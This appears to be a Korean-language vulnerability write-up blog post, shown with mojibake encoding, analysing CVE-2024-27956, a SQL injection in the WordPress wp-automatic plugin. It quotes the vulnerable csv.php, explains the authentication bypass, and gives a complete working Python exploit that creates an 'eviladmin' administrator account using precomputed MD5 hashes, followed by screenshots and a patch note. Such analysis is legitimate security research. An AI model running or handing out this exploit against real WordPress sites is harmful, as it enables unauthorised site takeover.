---
title: "[CVE-2024-27956] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
description: "wordpress plugin wp-automatic 3.92.0 ë²„ì „ ì´í•˜ì—ì„œ ë°œìƒí•˜ëŠ” SQL Injection ì·¨ì•½ì "
author: khh
date: 2024-11-07 20:52:00 +0900
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ, ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼, WordPress, wp-automatic, CVE, CVE-2024-27956]
image:
---

## ğŸ“ Analysis

## **ê°œìš”**

CVE-2024-27956ì€ wordpress ìë™ ì½˜í…ì¸  ê²Œì‹œ í”ŒëŸ¬ê·¸ì¸ wp-automaticì—ì„œ ë°œìƒí•˜ëŠ” SQL injection ì·¨ì•½ì ì´ë‹¤.

## **ì‹¤ìŠµ í™˜ê²½**

WSL2 ubuntu 22.08

ì·¨ì•½ì : SQL Injection

CVSS: 9.8

ì·¨ì•½í•œ ë²„ì „: <= 3.92.0

plugin: https://github.com/truonghuuphuc/CVE-2024-27956?tab=readme-ov-file

## **ì·¨ì•½ì **

ì·¨ì•½ì ì€ csv.php íŒŒì¼ì—ì„œ ë°œìƒí•œë‹¤. csv.phpëŠ” ì‚¬ìš©ì ë¡œê·¸ì¸ ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” í•µì‹¬ íŒŒì¼ì´ë‹¤. 
í•´ë‹¹ íŒŒì¼ì—ì„œ ì‚¬ìš©ì ì…ë ¥ ê²€ì¦ì´ ì œëŒ€ë¡œ ì´ë£¨ì–´ì§€ì§€ ì•Šì•„ SQL ì¸ì ì…˜ ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤.

## wp-automatic/inc/csv.php

```php
<?php
require_once('../../../../wp-load.php');
global $wpdb;

 

  global $current_user;
  wp_get_current_user();

     //   echo user_login . "'s email address is: " . $current_user->user_pass;
 

//get admin pass for integrity check 

// extract query
$q = stripslashes($_POST['q']);
$auth = stripslashes($_POST['auth']);
$integ=stripslashes($_POST['integ']);

if(wp_automatic_trim($auth == '')){
	
	  echo 'login required';
	exit;
}

if(wp_automatic_trim($auth) != wp_automatic_trim($current_user->user_pass)){
	  echo 'invalid login';
	exit;
}

if(md5(wp_automatic_trim($q.$current_user->user_pass)) != $integ ){
	  echo 'Tampered query';
	exit;
}
 

$rows=$wpdb->get_results( $q);
$date=date("F j, Y, g:i a s");
$fname=md5($date);
header("Content-type: application/csv");
header("Content-Disposition: attachment; filename=$fname.csv");
header("Pragma: no-cache");
header("Expires: 0");

  echo "DATE,ACTION,DATA,KEYWORD \n";
foreach($rows as $row){
	
	$action=$row->action;
	if (stristr($action , 'New Comment Posted on :')){
			$action = 'Posted Comment';
		}elseif(stristr($action , 'approved')){
			$action = 'Approved Comment';
	}
	
	//format date
	$date=date('Y-n-j H:i:s',strtotime ($row->date));

	$data=$row->data;
	$keyword='';
	//filter the data strip keyword
	if(stristr($data,';')){
		$datas=explode(';',$row->data);
		$data=$datas[0];
		$keyword=$datas[1];
	}
	  echo "$date,$action,$data,$keyword \n";

}

//  echo "record1,$q,record3\n";

?>

```

---

$q ë³€ìˆ˜ì— ì„ì˜ì˜ SQL ì¿¼ë¦¬ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆê³ , $pdb->get_results($q) ì—ì„œ SQL ì¿¼ë¦¬ë¬¸ì´ ì‹¤í–‰ëœë‹¤. ê·¸ëŸ¬ë‚˜ wp_automatic_trim($q.$current_user->user_pass) ì™€ md5(wp_automatic_trim($q.$current_user->user_pass) ë¥¼ ì‚¬ìš©í•œ ê²€ì‚¬ê°€ êµ¬í˜„ë˜ì–´ ìˆë‹¤.

## wp-automatic/wp-automatic.php

```php
//function wordpress automatic trim to trim a string, accepts a string or a null and if null, it returns an empty string and if a string, it trim it using trim function
//for PHP 8.2 compatibility

function wp_automatic_trim($str)

{

	if (is_null($str)) {

		return '';

	} else {

			return trim($str);

	}

}
```

---

wp_automatic_trim í•¨ìˆ˜ì— ì „ë‹¬ëœ ê°’ì— ëŒ€í•´ ê¸°ë³¸ì ì¸ ê³µë°± ì œê±° ì‘ì—…ì„ ìˆ˜í–‰í•œë‹¤. ì²« ë²ˆì§¸ ê°’ $current_user -> user_pass ëŠ” ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ íŒŒì¼ì— ì ‘ê·¼í•  ê²½ìš° ë¹ˆ ë¬¸ìì—´ì´ ëœë‹¤. ë”°ë¼ì„œ $auth ë³€ìˆ˜ì— ë¹ˆ ë¬¸ìì—´ì„ ì „ë‹¬í•˜ë©´ ëœë‹¤. ë‘ ë²ˆì§¸ ê²€ì‚¬ì—ì„œëŠ” $current_user -> user_passê°€ ë¹ˆ ë¬¸ìì—´ì´ë¯€ë¡œ, $q ë³€ìˆ˜ì— ì „ë‹¬í•œ SQL ì¿¼ë¦¬ë¬¸ì— ëŒ€í•œ MD5 ê°’ë§Œ ì‚½ì…í•˜ë©´ëœë‹¤.

í•˜ì§€ë§Œ ì´ ë‘ ê²€ì‚¬ ì „ì— if(wp_automatic_trim($auth == '')) $authê°’ì— ë¹ˆ ë¬¸ìì—´ì„ ì „ë‹¬í•  ìˆ˜ ì—†ëŠ”ë°, $auth ê°’ì— ê³µë°± í•œ ì¹¸(â€œâ€)ì„ ì…ë ¥í•˜ë©´ ì¡°ê±´ë¬¸ì„ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.

# **POC**

SQL ì¸ì ì…˜ ì·¨ì•½ì ì„ ì´ìš©í•´ ì•…ì„± ê´€ë¦¬ì ê³„ì •ì¸ â€œeviladminâ€ì„ ìƒì„±í•˜ëŠ” ê²ƒì´ ëª©í‘œë¡œ í•œë‹¤.

![image.png](assets/posts/one-day/2024-11-07/image-001.png)

![image.png](assets/posts/one-day/2024-11-07/image-002.png)

wp-automatic.zip íŒŒì¼ì„ íŒŒì¼ ì„ íƒ ê¸°ëŠ¥ì„ ì´ìš©í•´ ì¶”ê°€í•´ì¤€ë‹¤.

![image.png](assets/posts/one-day/2024-11-07/image-003.png)

![image.png](assets/posts/one-day/2024-11-07/image-004.png)

í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•˜ê³ , í™œì„±í™” ì‹œì¼œì¤€ë‹¤.


### **exploit code**

```python
import requests

import sys

def makeRequest(payload, hash, url):

host = url.split('/', 3)[2]

headers = {

'Host': host,

'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',

'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',

'Accept-Language': 'en-US,en;q=0.5',

'Accept-Encoding': 'gzip, deflate, br',

'Content-type': 'application/x-www-form-urlencoded',

'Connection': 'close',

'Upgrade-Insecure-Requests': '1'

}

data = {

'q': payload,

'auth': b'\0',

'integ': hash

}

response = requests.post(url, data=data, headers=headers)

return response

def helpUsage():

print("[+] You must run the exploit passing the WordPress URL. \n[+] Example: python exploit.py http://website.com")

quit()

def verifyArgs(argv):

if len(sys.argv) != 2:

helpUsage()

verifyArgs(sys.argv)

print("[+] Exploit for CVE-2024-27956")

domain = sys.argv[1]

url = domain + '/wp-content/plugins/wp-automatic/inc/csv.php'

# First request (create user)

print("[+] Creating user eviladmin")

response = makeRequest("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')", "09956ea086b172d6cf8ac31de406c4c0", url)

if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:

print("[+] Error in the payload")

quit()

if "DATE" not in response.text:

print("[+] Not vulnerable")

quit()

# Second request (give permission)

print("[+] Giving eviladmin administrator permissions")

makeRequest("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'eviladmin'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')", "bd98494b41544b818fa9f583dadfa2bb", url)

if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:

print("[+] Error in the payload")

quit()

print("[+] Exploit completed!")

print("[+] Administrator created: eviladmin:admin")
```

---

![image.png](assets/posts/one-day/2024-11-07/image-005.png)

í˜„ì¬ dbì—ëŠ” khhë¼ëŠ” ì‚¬ìš©ì ê³„ì •ë°–ì— ì—†ë‹¤.

ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë©´, ì‚¬ìš©ì ê³„ì •ì„ ì¶”ê°€í•˜ëŠ” ë™ì‹œì— ê´€ë¦¬ì ê¶Œí•œì„ ë¶€ì—¬í•œë‹¤.

![image.png](assets/posts/one-day/2024-11-07/image-006.png)

![image.png](assets/posts/one-day/2024-11-08/image-007.png)

ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê³ , ì‚¬ìš©ì dbë¥¼ ë³´ë©´ eviladmin ê³„ì •ì´ ì¶”ê°€ë˜ì–´ìˆë‹¤.

![image.png](assets/posts/one-day/2024-11-07/image-008.png)

ì›Œë“œí”„ë ˆìŠ¤ ì‚¬ìš©ì í˜ì´ì§€ì—ë„ eviladmin ê³„ì •ì´ ì¶”ê°€ë˜ê³ , ê´€ë¦¬ì ê¶Œí•œì´ ë¶€ì—¬ë˜ì–´ìˆë‹¤.

# íŒ¨ì¹˜

í•´ë‹¹ ë²¤ë”ì‚¬ì—ì„œëŠ” inc/csv.php íŒŒì¼ì„ ì™„ì „íˆ ì œê±°í–ˆë‹¤.